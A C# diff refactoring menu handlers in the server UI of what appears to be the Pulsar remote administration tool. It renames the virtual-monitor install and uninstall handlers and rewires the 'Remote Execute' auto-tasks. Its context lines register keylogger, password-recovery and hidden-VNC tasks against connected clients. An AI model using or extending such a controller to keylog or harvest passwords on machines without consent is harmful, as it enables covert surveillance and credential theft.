@@ -2621,36 +2621,12 @@ namespace Pulsar.Server.Forms
 
         private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            foreach (Client c in GetSelectedClients())
-            {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoInstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-            }
+
         }
 
         private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Client c in GetSelectedClients())
-            {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoUninstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-            }
+
         }
 
         #endregion "Monitoring"
@@ -4019,16 +3995,16 @@ namespace Pulsar.Server.Forms
             RegisterDefaultAutoTask(registryEditorToolStripMenuItem, registryEditorToolStripMenuItem_Click);
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
-                localFileToolStripMenuItem.Name,
+                remoteExecuteToolStripMenuItem.Name,
                 "Remote Execute (Local File)",
-                localFileToolStripMenuItem,
+                remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteLocalAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteLocalAutoTask(client, task)));
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
-                webFileToolStripMenuItem.Name,
+                remoteExecuteToolStripMenuItem.Name,
                 "Remote Execute (Web File)",
-                webFileToolStripMenuItem,
+                remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteWebAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteWebAutoTask(client, task)));
 
@@ -4044,8 +4020,8 @@ namespace Pulsar.Server.Forms
             RegisterDefaultAutoTask(hVNCToolStripMenuItem, hVNCToolStripMenuItem_Click);
             RegisterDefaultAutoTask(keyloggerToolStripMenuItem, keyloggerToolStripMenuItem_Click);
             RegisterDefaultAutoTask(passwordRecoveryToolStripMenuItem, passwordRecoveryToolStripMenuItem_Click);
-            RegisterDefaultAutoTask(installVirtualMonitorToolStripMenuItem1, installVirtualMonitorToolStripMenuItem1_Click);
-            RegisterDefaultAutoTask(uninstallVirtualMonitorToolStripMenuItem, uninstallVirtualMonitorToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(installToolStripMenuItem, installToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(uninstallToolStripMenuItem, uninstallToolStripMenuItem1_Click);
 
             // User support
             RegisterDefaultAutoTask(remoteChatToolStripMenuItem, remoteChatToolStripMenuItem_Click);
@@ -5392,6 +5368,50 @@ namespace Pulsar.Server.Forms
                 }
             }
 
+        }
+
+        private void installToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoInstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void uninstallToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoUninstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
+            }
         }
     }
 
